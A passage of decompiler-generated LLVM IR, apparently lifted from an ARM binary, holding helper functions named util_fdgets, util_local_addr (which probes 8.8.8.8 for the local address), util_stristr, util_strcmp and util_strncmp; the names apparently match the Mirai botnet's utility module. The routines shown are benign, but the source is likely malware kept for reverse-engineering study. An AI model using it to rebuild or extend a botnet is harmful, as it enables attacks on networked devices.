  %v1_11a74 = phi i1 [ %v7_11a60, %bb58 ], [ %v11_11a70, %bb59 ]
  %v0_11a74 = phi i1 [ %v2_11a60, %bb58 ], [ %v6_11a70, %bb59 ]
  %v2_11a74 = xor i1 %v1_11a74, true
  %v3_11a74 = and i1 %v0_11a74, %v2_11a74
  br i1 %v3_11a74, label %dec_label_pc_11ad8, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %bb60
  %v2_11a78 = icmp eq i32 %v0_11a78, 0
  %. = select i1 %v2_11a78, i32 87, i32 55
  %v2_11a84 = sub nsw i32 %v1_11a84, %.
  br label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a44, %dec_label_pc_11a78
  %v0_11a9c33 = phi i32 [ %v1_11a58, %dec_label_pc_11a44 ], [ %., %dec_label_pc_11a78 ]
  %v3_11ac0 = phi i32 [ %v1_11a54, %dec_label_pc_11a44 ], [ %v2_11a84, %dec_label_pc_11a78 ]
  %v2_11a88 = sub i32 %v3_11ac0, %arg2
  %v4_11a88 = xor i32 %v3_11ac0, %arg2
  %v5_11a88 = xor i32 %v2_11a88, %v3_11ac0
  %v6_11a88 = and i32 %v5_11a88, %v4_11a88
  %v7_11a88 = icmp slt i32 %v6_11a88, 0
  %v8_11a88 = icmp slt i32 %v2_11a88, 0
  %v2_11a8c = xor i1 %v8_11a88, %v7_11a88
  br i1 %v2_11a8c, label %dec_label_pc_11a90, label %dec_label_pc_11ad8

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a88
  br i1 %v3_11a94, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_11a90
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_11a90, %bb63
  %v0_11a9c32 = phi i32 [ %v0_11a9c33, %dec_label_pc_11a90 ], [ 0, %bb63 ]
  br i1 %v3_11a98, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_11a9c = phi i32 [ %v0_11a9c32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_11a9c, 0
  %v4_11a9c = zext i1 %tmp88 to i32
  %v5_11a9c = or i32 %v0_11a9c, %v4_11a9c
  %v7_11a9c = icmp eq i32 %v5_11a9c, 0
  br i1 %v7_11a9c, label %dec_label_pc_11aa4, label %dec_label_pc_11acc

dec_label_pc_11aa4:                               ; preds = %bb66
  %v2_11ab0 = sub i32 %v3_11ac0, %v3_11a24
  %v4_11ab0 = xor i32 %v3_11ac0, %v3_11a24
  %v5_11ab0 = xor i32 %v2_11ab0, %v3_11ac0
  %v6_11ab0 = and i32 %v5_11ab0, %v4_11ab0
  %v7_11ab0 = icmp slt i32 %v6_11ab0, 0
  %v8_11ab0 = icmp slt i32 %v2_11ab0, 0
  %v9_11ab0 = icmp eq i32 %v3_11ac0, %v3_11a24
  %v3_11ab4 = xor i1 %v8_11ab0, %v7_11ab0
  %v4_11ab4 = or i1 %v9_11ab0, %v3_11ab4
  br i1 %v4_11ab4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_11aa4
  store i32 1, i32* @ip, align 4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_11aa4
  store i32 1, i32* @ip, align 4
  br i1 %v2_11ab8, label %.thread5, label %dec_label_pc_11acc

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_11ac0 = mul i32 %v2_11ac0.ph, %arg2
  %v5_11ac0 = add i32 %v3_11ac0, %v4_11ac0
  %v2_11ac4 = inttoptr i32 %v1_11ac4 to i8*
  %v3_11ac4 = load i8, i8* %v2_11ac4, align 1
  %v6_11ac4 = add i32 %v1_11ac4, 1
  br label %dec_label_pc_11a44.outer

dec_label_pc_11acc:                               ; preds = %thread-pre-split, %bb66
  %v1_11acc = inttoptr i32 %v1_11ac4 to i8*
  %v2_11acc = load i8, i8* %v1_11acc, align 1
  %v5_11acc = add i32 %v1_11ac4, 1
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11ad8:                               ; preds = %dec_label_pc_11a88, %bb60
  %v1_11ad8 = icmp slt i32 %v1_11a9c, 0
  %v2_11b04 = icmp eq i32 %v0_11b04, 0
  br i1 %v1_11ad8, label %dec_label_pc_11b04, label %dec_label_pc_11ae0

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11ad8
  br i1 %v2_11b04, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_11ae0
  %v2_11ae4 = sub i32 0, %v2_11ac0.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_11ae0, %bb69
  %v1_11af0 = phi i32 [ -2147483648, %bb71 ], [ %v2_11ac0.ph, %dec_label_pc_11ae0 ], [ %v2_11ae4, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_11af0

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11a04
  %v1_11af4 = inttoptr i32 %v5_119e8 to i8*
  %v2_11af4 = load i8, i8* %v1_11af4, align 1
  %v5_11af4 = add i32 %v0_119e8, 2
  br label %dec_label_pc_11a1c

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11ad8
  br i1 %v2_11b04, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_11b04
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_11b04
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_11b04, { 1, 0 }
  uselistorder i32 %v2_11ab0, { 1, 0 }
  uselistorder i32 %v2_11a88, { 1, 0 }
  uselistorder i32 %v3_11ac0, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_11a60, { 1, 2, 0 }
  uselistorder i1 %v2_11a60, { 1, 0, 2 }
  uselistorder i32 %v1_11a44, { 1, 2, 0 }
  uselistorder i32 %v1_11a84, { 1, 0, 2 }
  uselistorder i32 %v1_11a9c, { 1, 0 }
  uselistorder i32 %v1_11ac4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_11a90, { 1, 0, 2 }
  uselistorder i1 %v3_11a90, { 1, 0 }
  uselistorder i32 %v2_11ac0.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_11a24, { 1, 0, 2 }
  uselistorder i32 %v2_11a24, { 1, 0 }
  uselistorder i32 %v5_119e8, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_119e8, { 0, 1, 3, 2 }
  uselistorder i32 25, { 10, 11, 0, 9, 1, 6, 2, 7, 3, 8, 5, 4, 12 }
  uselistorder i8 32, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 9, { 4, 0, 3, 1, 2 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_11a88, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_11a44, { 1, 0 }
  uselistorder label %dec_label_pc_11a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_119e8, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11b14 = load i32, i32* @r4, align 4
  store i32 %v3_11b14, i32* %stack_var_-24, align 4
  %v6_11b14 = load i32, i32* @r5, align 4
  %v9_11b14 = load i32, i32* @r6, align 4
  %v12_11b14 = load i32, i32* @r7, align 4
  %v15_11b14 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11b2c

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11b50.dec_label_pc_11b2c_crit_edge, %entry
  %v0_11b30 = phi i32 [ %v0_11b30.pre, %dec_label_pc_11b50.dec_label_pc_11b2c_crit_edge ], [ %arg3, %entry ]
  %v0_11b2c = phi i32 [ %v5_11b50, %dec_label_pc_11b50.dec_label_pc_11b2c_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_11b2c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_11b38 = call i32 @__libc_read(i32 %v0_11b30)
  %v7_11b3c = icmp eq i32 %v1_11b38, 1
  %v0_11b44 = load i32, i32* @r5, align 4
  br i1 %v7_11b3c, label %dec_label_pc_11b44, label %dec_label_pc_11b5c

dec_label_pc_11b44:                               ; preds = %dec_label_pc_11b2c
  %v1_11b44 = add i32 %v0_11b44, 1
  store i32 %v1_11b44, i32* @r5, align 4
  %v1_11b48 = load i32, i32* @r8, align 4
  %v6_11b4c = icmp slt i32 %v1_11b44, %v1_11b48
  br i1 %v6_11b4c, label %dec_label_pc_11b50, label %.loopexit

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b44
  %v0_11b50 = load i32, i32* @r4, align 4
  %v1_11b50 = inttoptr i32 %v0_11b50 to i8*
  %v2_11b50 = load i8, i8* %v1_11b50, align 1
  %v3_11b50 = zext i8 %v2_11b50 to i32
  store i32 %v3_11b50, i32* @r3, align 4
  %v5_11b50 = add i32 %v0_11b50, 1
  store i32 %v5_11b50, i32* @r4, align 4
  %v7_11b54 = icmp eq i8 %v2_11b50, 10
  br i1 %v7_11b54, label %dec_label_pc_11b5c, label %dec_label_pc_11b50.dec_label_pc_11b2c_crit_edge

dec_label_pc_11b50.dec_label_pc_11b2c_crit_edge:  ; preds = %dec_label_pc_11b50
  %v0_11b30.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11b2c

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11b2c, %dec_label_pc_11b50
  %v0_11b5c = phi i32 [ %v1_11b44, %dec_label_pc_11b50 ], [ %v0_11b44, %dec_label_pc_11b2c ]
  %v2_11b5c = icmp eq i32 %v0_11b5c, 0
  br i1 %v2_11b5c, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_11b5c
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_11b44, %dec_label_pc_11b5c, %bb
  %v0_11b64 = load i32, i32* @r7, align 4
  %v2_11b68 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11b68, i32* @r4, align 4
  store i32 %v6_11b14, i32* @r5, align 4
  store i32 %v9_11b14, i32* @r6, align 4
  store i32 %v12_11b14, i32* @r7, align 4
  store i32 %v15_11b14, i32* @r8, align 4
  ret i32 %v0_11b64

; uselistorder directives
  uselistorder i32 %v5_11b50, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11b5c, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11b70 = load i32, i32* @r4, align 4
  %v6_11b70 = load i32, i32* @r5, align 4
  %v9_11b70 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_11b80 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_11b88 = inttoptr i32 %v0_11b80 to i32*
  store i32 0, i32* %v2_11b88, align 4
  %v0_11b94 = load i32, i32* %r4.global-to-local, align 4
  %v3_11b98 = call i32 @socket(i32 2, i32 2, i32 %v0_11b94)
  %v7_11b9c = icmp eq i32 %v3_11b98, -1
  store i32 %v3_11b98, i32* @r5, align 4
  br i1 %v7_11b9c, label %bb, label %dec_label_pc_11bac

bb:                                               ; preds = %entry
  %v1_11ba4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11bf8

dec_label_pc_11bac:                               ; preds = %entry
  %v2_11bb8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11bb8, i32* @r4, align 4
  %v0_11bc4 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_11bd8 = call i32 @__libc_connect(i32 %v3_11b98, i32 %v2_11bb8, i32 %v0_11bc4)
  store i32 %v2_11bb8, i32* @r1, align 4
  %v2_11be0 = ptrtoint i32* %stack_var_-20 to i32
  %v0_11be4 = load i32, i32* @r5, align 4
  %v3_11be8 = call i32 @__GI_getsockname(i32 %v0_11be4, i32 %v2_11bb8, i32 %v2_11be0)
  %v0_11bec = load i32, i32* @r5, align 4
  %v1_11bf0 = call i32 @__GI___libc_close(i32 %v0_11bec)
  br label %dec_label_pc_11bf8

dec_label_pc_11bf8:                               ; preds = %bb, %dec_label_pc_11bac
  %storemerge = phi i32 [ 134744072, %dec_label_pc_11bac ], [ %v1_11ba4, %bb ]
  store i32 %v3_11b70, i32* @r4, align 4
  store i32 %v6_11b70, i32* @r5, align 4
  store i32 %v9_11b70, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11bb8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11b98, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 134744072, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 17, 18, 15, 16, 2, 1, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_11bf8, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_11c08 = load i8, i8* %tmp, align 1
  %v4_11c08 = zext i8 %v3_11c08 to i32
  store i32 %v4_11c08, i32* @r3, align 4
  %v2_11c0c = icmp eq i8 %v3_11c08, 0
  br i1 %v2_11c0c, label %bb, label %dec_label_pc_11c20

bb:                                               ; preds = %entry
  br label %dec_label_pc_11c34

dec_label_pc_11c20:                               ; preds = %entry
  br label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c24, %dec_label_pc_11c20
  %v0_11c24 = phi i32 [ %v1_11c24, %dec_label_pc_11c24 ], [ 0, %dec_label_pc_11c20 ]
  %v1_11c24 = add i32 %v0_11c24, 1
  %v2_11c28 = add i32 %v1_11c24, %arg2
  %v3_11c28 = inttoptr i32 %v2_11c28 to i8*
  %v4_11c28 = load i8, i8* %v3_11c28, align 1
  %v6_11c28 = zext i8 %v4_11c28 to i32
  store i32 %v6_11c28, i32* @r3, align 4
  %v2_11c2c = icmp eq i8 %v4_11c28, 0
  br i1 %v2_11c2c, label %dec_label_pc_11c34, label %dec_label_pc_11c24

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11c24, %bb
  %v0_11c7821 = phi i32 [ %v4_11c08, %bb ], [ %v1_11c24, %dec_label_pc_11c24 ]
  %v0_11c3c2 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_11c3c2, 1
  br i1 %tmp29, label %dec_label_pc_11c8c, label %dec_label_pc_11c48

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c34, %dec_label_pc_11c3c.backedge
  %v0_11c40.in = phi i32 [ %v0_11c40, %dec_label_pc_11c3c.backedge ], [ %v0_11c3c2, %dec_label_pc_11c34 ]
  %v1_11c54 = phi i32 [ %v1_11c5415, %dec_label_pc_11c3c.backedge ], [ 0, %dec_label_pc_11c34 ]
  %v0_11c48 = phi i32 [ %v5_11c48, %dec_label_pc_11c3c.backedge ], [ %tmp23, %dec_label_pc_11c34 ]
  %v0_11c40 = add i32 %v0_11c40.in, -1
  %v1_11c48 = inttoptr i32 %v0_11c48 to i8*
  %v2_11c48 = load i8, i8* %v1_11c48, align 1
  %v3_11c48 = zext i8 %v2_11c48 to i32
  store i32 %v3_11c48, i32* @ip, align 4
  %v5_11c48 = add i32 %v0_11c48, 1
  %v1_11c4c = add nsw i32 %v3_11c48, -65
  %v2_11c54 = add i32 %v1_11c54, %arg2
  %v3_11c54 = inttoptr i32 %v2_11c54 to i8*
  %v4_11c54 = load i8, i8* %v3_11c54, align 1
  %v6_11c54 = zext i8 %v4_11c54 to i32
  store i32 %v6_11c54, i32* @r3, align 4
  %v1_11c58 = add nsw i32 %v6_11c54, -65
  %tmp38 = icmp ult i32 %v1_11c4c, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_11c48
  %v5_11c5c = or i32 %v3_11c48, 96
  store i32 %v5_11c5c, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11c48, %bb30
  %v0_11c68 = phi i32 [ %v3_11c48, %dec_label_pc_11c48 ], [ %v5_11c5c, %bb30 ]
  %tmp39 = icmp ult i32 %v1_11c58, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_11c64 = or i32 %v6_11c54, 96
  store i32 %v5_11c64, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_11c68 = phi i32 [ %v6_11c54, %bb31 ], [ %v5_11c64, %bb32 ]
  %v9_11c68 = icmp eq i32 %v0_11c68, %v1_11c68
  br i1 %v9_11c68, label %dec_label_pc_11c74, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_11c3c.backedge

dec_label_pc_11c3c.backedge:                      ; preds = %bb34, %dec_label_pc_11c74
  %v1_11c5415 = phi i32 [ 0, %bb34 ], [ %v1_11c74, %dec_label_pc_11c74 ]
  %tmp35 = icmp slt i32 %v0_11c40, 1
  br i1 %tmp35, label %dec_label_pc_11c8c, label %dec_label_pc_11c48

dec_label_pc_11c74:                               ; preds = %bb33
  %v1_11c74 = add i32 %v1_11c54, 1
  %v9_11c78 = icmp eq i32 %v0_11c7821, %v1_11c74
  br i1 %v9_11c78, label %dec_label_pc_11c80, label %dec_label_pc_11c3c.backedge

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11c74
  %v2_11c80 = sub i32 %v5_11c48, %tmp23
  br label %dec_label_pc_11c8c

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c3c.backedge, %dec_label_pc_11c34, %dec_label_pc_11c80
  %storemerge = phi i32 [ %v2_11c80, %dec_label_pc_11c80 ], [ -1, %dec_label_pc_11c34 ], [ -1, %dec_label_pc_11c3c.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_11c74, { 1, 0 }
  uselistorder i32 %v0_11c48, { 1, 0 }
  uselistorder i32 %v1_11c54, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 9, 3, 6, 4, 7, 5, 8, 10 }
  uselistorder label %dec_label_pc_11c8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c3c.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_11c48, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11c94 = load i8, i8* %arg1, align 1
  %v2_11c98 = icmp eq i8 %v2_11c94, 0
  br i1 %v2_11c98, label %bb, label %dec_label_pc_11ca4

bb:                                               ; preds = %entry
  %v3_11c94 = zext i8 %v2_11c94 to i32
  br label %dec_label_pc_11cb8

dec_label_pc_11ca4:                               ; preds = %entry
  br label %dec_label_pc_11ca8

dec_label_pc_11ca8:                               ; preds = %dec_label_pc_11ca8, %dec_label_pc_11ca4
  %v0_11ca8 = phi i32 [ %v1_11ca8, %dec_label_pc_11ca8 ], [ 0, %dec_label_pc_11ca4 ]
  %v1_11ca8 = add i32 %v0_11ca8, 1
  %v2_11cac = add i32 %v1_11ca8, %tmp
  %v3_11cac = inttoptr i32 %v2_11cac to i8*
  %v4_11cac = load i8, i8* %v3_11cac, align 1
  %v2_11cb0 = icmp eq i8 %v4_11cac, 0
  br i1 %v2_11cb0, label %dec_label_pc_11cb8, label %dec_label_pc_11ca8

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11ca8, %bb
  %v0_11d043 = phi i32 [ %v3_11c94, %bb ], [ %v1_11ca8, %dec_label_pc_11ca8 ]
  %v1_11cb8 = inttoptr i32 %arg2 to i8*
  %v2_11cb8 = load i8, i8* %v1_11cb8, align 1
  %v2_11cbc = icmp eq i8 %v2_11cb8, 0
  br i1 %v2_11cbc, label %bb21, label %dec_label_pc_11cc8

bb21:                                             ; preds = %dec_label_pc_11cb8
  %v3_11cb8 = zext i8 %v2_11cb8 to i32
  br label %dec_label_pc_11cdc

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cb8
  br label %dec_label_pc_11ccc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11ccc, %dec_label_pc_11cc8
  %v0_11ccc = phi i32 [ %v1_11ccc, %dec_label_pc_11ccc ], [ 0, %dec_label_pc_11cc8 ]
  %v1_11ccc = add i32 %v0_11ccc, 1
  %v2_11cd0 = add i32 %v1_11ccc, %arg2
  %v3_11cd0 = inttoptr i32 %v2_11cd0 to i8*
  %v4_11cd0 = load i8, i8* %v3_11cd0, align 1
  %v2_11cd4 = icmp eq i8 %v4_11cd0, 0
  br i1 %v2_11cd4, label %dec_label_pc_11cdc, label %dec_label_pc_11ccc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11ccc, %bb21
  %v0_11cdc = phi i32 [ %v3_11cb8, %bb21 ], [ %v1_11ccc, %dec_label_pc_11ccc ]
  %v9_11cdc = icmp eq i32 %v0_11cdc, %v0_11d043
  br i1 %v9_11cdc, label %dec_label_pc_11d04.preheader, label %dec_label_pc_11ce4

dec_label_pc_11d04.preheader:                     ; preds = %dec_label_pc_11cdc
  %v2_11d045 = icmp eq i32 %v0_11d043, 0
  br i1 %v2_11d045, label %dec_label_pc_11d0c, label %dec_label_pc_11cec

dec_label_pc_11ce4:                               ; preds = %dec_label_pc_11cec, %dec_label_pc_11cdc
  ret i32 0

dec_label_pc_11cec:                               ; preds = %dec_label_pc_11cfc, %dec_label_pc_11d04.preheader
  %v0_11d04.in = phi i32 [ %v0_11d04, %dec_label_pc_11cfc ], [ %v0_11d043, %dec_label_pc_11d04.preheader ]
  %v0_11d00 = phi i32 [ %v1_11d00, %dec_label_pc_11cfc ], [ %arg2, %dec_label_pc_11d04.preheader ]
  %v0_11cfc = phi i32 [ %v1_11cfc, %dec_label_pc_11cfc ], [ %tmp, %dec_label_pc_11d04.preheader ]
  %v0_11d04 = add i32 %v0_11d04.in, -1
  %v1_11cec = inttoptr i32 %v0_11cfc to i8*
  %v2_11cec = load i8, i8* %v1_11cec, align 1
  %v1_11cf0 = inttoptr i32 %v0_11d00 to i8*
  %v2_11cf0 = load i8, i8* %v1_11cf0, align 1
  %v9_11cf4 = icmp eq i8 %v2_11cec, %v2_11cf0
  br i1 %v9_11cf4, label %dec_label_pc_11cfc, label %dec_label_pc_11ce4

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11cec
  %v1_11cfc = add i32 %v0_11cfc, 1
  %v1_11d00 = add i32 %v0_11d00, 1
  %v2_11d04 = icmp eq i32 %v0_11d04, 0
  br i1 %v2_11d04, label %dec_label_pc_11d0c, label %dec_label_pc_11cec

dec_label_pc_11d0c:                               ; preds = %dec_label_pc_11cfc, %dec_label_pc_11d04.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_11cb8, { 1, 0 }
  uselistorder i8 %v2_11c94, { 1, 0 }
}

define i32 @util_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11d18 = load i8, i8* %arg1, align 1
  %v2_11d1c = icmp eq i8 %v2_11d18, 0
  %v0_11d20 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_11d1c, label %bb, label %dec_label_pc_11d2c

bb:                                               ; preds = %entry
  %v3_11d18 = zext i8 %v2_11d18 to i32
  br label %dec_label_pc_11d40

dec_label_pc_11d2c:                               ; preds = %entry
  br label %dec_label_pc_11d30

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d30, %dec_label_pc_11d2c
  %v0_11d30 = phi i32 [ %v1_11d30, %dec_label_pc_11d30 ], [ 0, %dec_label_pc_11d2c ]
  %v1_11d30 = add i32 %v0_11d30, 1
  %v2_11d34 = add i32 %v1_11d30, %tmp
  %v3_11d34 = inttoptr i32 %v2_11d34 to i8*
  %v4_11d34 = load i8, i8* %v3_11d34, align 1
  %v2_11d38 = icmp eq i8 %v4_11d34, 0
  br i1 %v2_11d38, label %dec_label_pc_11d40, label %dec_label_pc_11d30

dec_label_pc_11d40:                               ; preds = %dec_label_pc_11d30, %bb
  %v6_11d68 = phi i32 [ %v3_11d18, %bb ], [ %v1_11d30, %dec_label_pc_11d30 ]
  %v0_11d40 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d40 = inttoptr i32 %v0_11d40 to i8*
  %v2_11d40 = load i8, i8* %v1_11d40, align 1
  %v3_11d40 = zext i8 %v2_11d40 to i32
  %v2_11d44 = icmp eq i8 %v2_11d40, 0
  br i1 %v2_11d44, label %bb26, label %dec_label_pc_11d50

bb26:                                             ; preds = %dec_label_pc_11d40
  store i32 %v3_11d40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d64

dec_label_pc_11d50:                               ; preds = %dec_label_pc_11d40
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d54, %dec_label_pc_11d50
  %v0_11d54 = phi i32 [ %v1_11d54, %dec_label_pc_11d54 ], [ 0, %dec_label_pc_11d50 ]
  %v1_11d54 = add i32 %v0_11d54, 1
  store i32 %v1_11d54, i32* %r2.global-to-local, align 4
  %v2_11d58 = add i32 %v1_11d54, %v0_11d40
  %v3_11d58 = inttoptr i32 %v2_11d58 to i8*
  %v4_11d58 = load i8, i8* %v3_11d58, align 1
  %v2_11d5c = icmp eq i8 %v4_11d58, 0
  br i1 %v2_11d5c, label %dec_label_pc_11d64, label %dec_label_pc_11d54

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d54, %bb26
  %v0_11d64 = phi i32 [ %v3_11d40, %bb26 ], [ %v1_11d54, %dec_label_pc_11d54 ]
  %v2_11d64 = sub i32 %v0_11d64, %v0_11d20
  %v4_11d64 = xor i32 %v0_11d64, %v0_11d20
  %v5_11d64 = xor i32 %v2_11d64, %v0_11d64
  %v6_11d64 = and i32 %v5_11d64, %v4_11d64
  %v5_11d68 = icmp slt i32 %v0_11d64, %v0_11d20
  br i1 %v5_11d68, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_11d64
  %v8_11d68 = sub i32 %v6_11d68, %v0_11d20
  %v10_11d68 = xor i32 %v6_11d68, %v0_11d20
  %v11_11d68 = xor i32 %v8_11d68, %v6_11d68
  %v12_11d68 = and i32 %v11_11d68, %v10_11d68
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_11d64, %bb27
  %v1_11d6c.in = phi i32 [ %v6_11d64, %dec_label_pc_11d64 ], [ %v12_11d68, %bb27 ]
  %v0_11d6c.in = phi i32 [ %v2_11d64, %dec_label_pc_11d64 ], [ %v8_11d68, %bb27 ]
  %v0_11d6c = icmp slt i32 %v0_11d6c.in, 0
  %v1_11d6c = icmp slt i32 %v1_11d6c.in, 0
  %v2_11d6c = xor i1 %v1_11d6c, %v0_11d6c
  br i1 %v2_11d6c, label %dec_label_pc_11d98, label %dec_label_pc_11d7c.preheader

dec_label_pc_11d7c.preheader:                     ; preds = %bb28
  %v2_11d7c5 = icmp eq i32 %v0_11d20, 0
  br i1 %v2_11d7c5, label %dec_label_pc_11d98, label %dec_label_pc_11d84

dec_label_pc_11d74:                               ; preds = %dec_label_pc_11d84
  %v1_11d74 = add i32 %v0_11d74, 1
  %v1_11d78 = add i32 %v0_11d78, 1
  store i32 %v1_11d78, i32* %r1.global-to-local, align 4
  %v2_11d7c = icmp eq i32 %v0_11d7c, 0
  br i1 %v2_11d7c, label %dec_label_pc_11d98, label %dec_label_pc_11d84

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d74, %dec_label_pc_11d7c.preheader
  %v0_11d7c.in = phi i32 [ %v0_11d7c, %dec_label_pc_11d74 ], [ %v0_11d20, %dec_label_pc_11d7c.preheader ]
  %v0_11d78 = phi i32 [ %v1_11d78, %dec_label_pc_11d74 ], [ %v0_11d40, %dec_label_pc_11d7c.preheader ]
  %v0_11d74 = phi i32 [ %v1_11d74, %dec_label_pc_11d74 ], [ %tmp, %dec_label_pc_11d7c.preheader ]
  %v0_11d7c = add i32 %v0_11d7c.in, -1
  %v1_11d84 = inttoptr i32 %v0_11d74 to i8*
  %v2_11d84 = load i8, i8* %v1_11d84, align 1
  %v3_11d84 = zext i8 %v2_11d84 to i32
  store i32 %v3_11d84, i32* %r2.global-to-local, align 4
  %v1_11d88 = inttoptr i32 %v0_11d78 to i8*
